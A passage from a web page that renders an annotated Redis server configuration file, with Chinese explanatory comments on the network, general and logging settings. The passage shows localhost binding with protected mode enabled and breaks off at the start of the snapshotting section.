class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="comment"># ./redis-server /path/to/redis.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5927;&#x5C0F;</span></span><br><span class="line"><span class="comment"># &#x901A;&#x5E38;&#x4E3A;&#x4EE5;&#x4E0B;&#x5F62;&#x5F0F;&#xFF1A;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1k =&gt; 1000 bytes</span></span><br><span class="line"><span class="comment"># 1kb =&gt; 1024 bytes</span></span><br><span class="line"><span class="comment"># 1m =&gt; 1000000 bytes</span></span><br><span class="line"><span class="comment"># 1mb =&gt; 1024*1024 bytes</span></span><br><span class="line"><span class="comment"># 1g =&gt; 1000000000 bytes</span></span><br><span class="line"><span class="comment"># 1gb =&gt; 1024*1024*1024 bytes</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x4EE5;&#x4E0A;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################## INCLUDES ###################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># include /path/to/local.conf</span></span><br><span class="line"><span class="comment"># include /path/to/other.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################## NETWORK #####################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x76D1;&#x542C;&#x7684;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment"># &#x9ED8;&#x8BA4;&#x76D1;&#x542C;&#x5728;127.0.0.1&#x5730;&#x5740;&#x4E0A;</span></span><br><span class="line"><span class="comment"># &#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E3A;0.0.0.0&#x5730;&#x5740;&#xFF0C;&#x6216;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6216;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x591A;&#x4E2A;&#xFF0C;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#x5206;&#x9694;&#x5373;&#x53EF;</span></span><br><span class="line"><span class="comment"># &#x793A;&#x4F8B;&#xFF1A;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># bind 192.168.1.100 10.0.0.1</span></span><br><span class="line"><span class="comment"># bind 127.0.0.1 ::1</span></span><br><span class="line"><span class="comment"># ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line">bind 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># protected&#x6A21;&#x5F0F;&#xFF1A;</span></span><br><span class="line"><span class="comment"># &#x5F53;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#x5F00;&#x542F;&#x5E76;&#x4E14;&#xFF1A;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1) bind&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x4E3A;&#x5176;&#x4ED6;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment"># 2) &#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x5BC6;&#x7801;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x53EA;&#x80FD;&#x672C;&#x673A;&#x8FDE;&#x63A5;</span></span><br><span class="line"><span class="comment"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x542F;&#x7528;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#x3002; &#x4EC5;&#x5728;&#x4EE5;&#x4E0B;&#x60C5;&#x51B5;&#x4E0B;&#x624D;&#x5E94;&#x7981;&#x7528;&#x5B83;</span></span><br><span class="line"><span class="comment"># &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#xFF0C;&#x8BF7;&#x5173;&#x95ED;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;</span></span><br><span class="line">protected-mode yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis Server&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;6379</span></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x6307;&#x5B9A;&#x7AEF;&#x53E3; 0&#xFF0C;Redis &#x5C06;&#x4E0D;&#x4F1A;&#x4FA6;&#x542C; TCP &#x5957;&#x63A5;&#x5B57;&#x3002;</span></span><br><span class="line">port 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6307;&#x5B9A;tcp-backlog&#x7684;&#x957F;&#x5EA6;</span></span><br><span class="line"><span class="comment"># &#x8BF4;&#x660E;&#xFF1A;&#x4EFB;&#x4F55;&#x7684;tcp&#x670D;&#x52A1;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x5230;tcp-backlog&#x529F;&#x80FD;&#xFF0C;backlog&#x662F;&#x4E00;&#x4E2A;&#x7B49;&#x5F85;&#x961F;&#x5217;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x6BD4;&#x5982;&#xFF1A;redis&#x7684;&#x5E76;&#x53D1;&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;redis&#x6709;&#x53EF;&#x80FD;&#x8FD0;&#x884C;&#x4E0D;&#x8FC7;&#x6765;&#x65F6;&#xFF0C;&#x5C31;&#x8FDE;&#x63A5;&#x672C;&#x5730;&#x7F13;&#x5B58;&#x7B49;&#x961F;&#x5217;&#x90FD;&#x6EE1;&#x4E86;&#x4EE5;&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;&#x989D;&#x5916;&#x7684;&#x5B58;&#x50A8;&#x5730;&#x65B9;&#xFF0C;&#x628A;&#x65B0;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x6682;&#x5B58;&#x4E0B;&#x6765;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x800C;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x5219;&#x79F0;&#x4E3A;backlog</span></span><br><span class="line">tcp-backlog 511</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unix socket.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x6307;&#x5B9A;&#x4F7F;&#x7528;sock&#x6587;&#x4EF6;&#x901A;&#x4FE1;&#x53CA;sock&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x670D;&#x52A1;&#x7AEF;&#x548C;&#x5BA2;&#x6237;&#x90FD;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x5EFA;&#x8BAE;&#x6253;&#x5F00;&#x6B64;&#x9879;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x57FA;&#x4E8E;sock&#x65B9;&#x5F0F;&#x901A;&#x4FE1;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4EA4;&#x6362;&#xFF0C;&#x6570;&#x636E;&#x4E0D;&#x7528;&#x518D;&#x7ECF;&#x8FC7;TCP/TP&#x534F;&#x8BAE;&#x6808;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#x3001;&#x62C6;&#x5C01;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># unixsocket /tmp/redis.sock</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;sock&#x6587;&#x4EF6;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;</span></span><br><span class="line"><span class="comment"># unixsocketperm 700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8868;&#x793A;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x7A7A;&#x95F2;&#xFF08;&#x975E;&#x6D3B;&#x8DC3;&#x3001;&#x6216;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x4EA4;&#x4E92;&#xFF09;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5219;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;</span></span><br><span class="line"><span class="comment"># 0&#x8868;&#x793A;&#x4E0D;&#x542F;&#x7528;&#x6B64;&#x529F;&#x80FD;</span></span><br><span class="line">timeout 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP keepalive.</span></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x662F;&#x5426;&#x542F;&#x7528;tcp-keepalive&#x529F;&#x80FD;</span></span><br><span class="line"><span class="comment"># &#x5355;&#x4F4D;(s/&#x79D2;) &#xFF0C;&#x7528;&#x4E8E;&#x53D1;&#x9001;TCP ACK</span></span><br><span class="line"></span><br><span class="line">tcp-keepalive 300</span><br><span class="line"></span><br><span class="line"><span class="comment">################################# GENERAL #####################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8868;&#x793A;redis&#x5E76;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x5219;&#x628A;no&#xFF0C;&#x6539;&#x4E3A;yes&#x5373;&#x53EF;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x811A;&#x672C;&#x542F;&#x52A8;&#xFF0C;&#x5373;&#x4F7F;daemonize&#x4E3A;no&#xFF0C;&#x4E5F;&#x4F1A;&#x8FD0;&#x884C;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</span></span><br><span class="line"></span><br><span class="line">daemonize no</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you run Redis from upstart or systemd, Redis can interact with your</span></span><br><span class="line"><span class="comment"># supervision tree. Options:</span></span><br><span class="line"><span class="comment">#   supervised no      - no supervision interaction</span></span><br><span class="line"><span class="comment">#   supervised upstart - signal upstart by putting Redis into SIGSTOP mode</span></span><br><span class="line"><span class="comment">#   supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET</span></span><br><span class="line"><span class="comment">#   supervised auto    - detect upstart or systemd method based on</span></span><br><span class="line"><span class="comment">#                        UPSTART_JOB or NOTIFY_SOCKET environment variables</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> these supervision methods only signal &quot;process is ready.&quot;</span></span><br><span class="line"><span class="comment">#       They do not enable continuous liveness pings back to your supervisor.</span></span><br><span class="line">supervised no</span><br><span class="line"></span><br><span class="line"><span class="comment"># If a pid file is specified, Redis writes it where specified at startup</span></span><br><span class="line"><span class="comment"># and removes it at exit.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># When the server runs non daemonized, no pid file is created if none is</span></span><br><span class="line"><span class="comment"># specified in the configuration. When the server is daemonized, the pid file</span></span><br><span class="line"><span class="comment"># is used even if not specified, defaulting to &quot;/var/run/redis.pid&quot;.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Creating a pid file is best effort: if Redis is not able to create it</span></span><br><span class="line"><span class="comment"># nothing bad happens, the server will start and run normally.</span></span><br><span class="line">pidfile /var/run/redis_6379.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;</span></span><br><span class="line"><span class="comment"># debug (&#x5F88;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x5BF9;&#x5F00;&#x53D1;/&#x6D4B;&#x8BD5;&#x5F88;&#x6709;&#x7528;)</span></span><br><span class="line"><span class="comment"># verbose (&#x8BB8;&#x591A;&#x5F88;&#x5C11;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x4F46;&#x4E0D;&#x50CF;&#x8C03;&#x8BD5;&#x7EA7;&#x522B;&#x90A3;&#x6837;&#x6DF7;&#x4E71;)</span></span><br><span class="line"><span class="comment"># notice (&#x9002;&#x5EA6;&#x5197;&#x957F;&#xFF0C;&#x60A8;&#x53EF;&#x80FD;&#x5728;&#x751F;&#x4EA7;&#x4E2D;&#x60F3;&#x8981;&#x4EC0;&#x4E48;)</span></span><br><span class="line"><span class="comment"># warning (&#x53EA;&#x8BB0;&#x5F55;&#x975E;&#x5E38;&#x91CD;&#x8981;/&#x5173;&#x952E;&#x7684;&#x6D88;&#x606F;)</span></span><br><span class="line">loglevel notice</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</span></span><br><span class="line"></span><br><span class="line">logfile /var/log/redis/redis.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8981;&#x542F;&#x7528;&#x5BF9;&#x7CFB;&#x7EDF;&#x8BB0;&#x5F55;&#x5668;&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#xFF0C;&#x53EA;&#x9700;&#x5C06; &apos;syslog-enabled&apos; &#x8BBE;&#x7F6E;&#x4E3A;&#x662F;&#xFF0C;</span></span><br><span class="line"><span class="comment"># &#x5E76;&#x53EF;&#x9009;&#x62E9;&#x66F4;&#x65B0;&#x5176;&#x4ED6;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x53C2;&#x6570;&#x4EE5;&#x6EE1;&#x8DB3;&#x60A8;&#x7684;&#x9700;&#x8981;&#x3002;</span></span><br><span class="line"><span class="comment"># syslog-enabled no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x6807;&#x8BC6;&#x3002;</span></span><br><span class="line"><span class="comment"># syslog-ident redis</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6307;&#x5B9A;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x5DE5;&#x5177;&#x3002; &#x5FC5;&#x987B;&#x662F; USER &#x6216; LOCAL0-LOCAL7 &#x4E4B;&#x95F4;&#x3002;</span></span><br><span class="line"><span class="comment"># syslog-facility local0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;redis&#x9ED8;&#x8BA4;&#x6709;&#x591A;&#x5C11;&#x4E2A;databases&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x4E2D;&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;</span></span><br><span class="line"><span class="comment"># dbid is a number between 0 and &apos;databases&apos;-1</span></span><br><span class="line">databases 16</span><br><span class="line"></span><br><span class="line"><span class="comment">################################ SNAPSHOTTING  ################################</span></span><br><span class="line"><span class="comment"># &#x5B9A;&#x4E49;RDB&#x7684;&#x6301;&#x4E45;&#x5316;&#x76F8;&#x5173;</span></span><br><span class="line"><span class="comment"># Save the DB on disk:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   save &lt;seconds&gt; &lt;changes&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   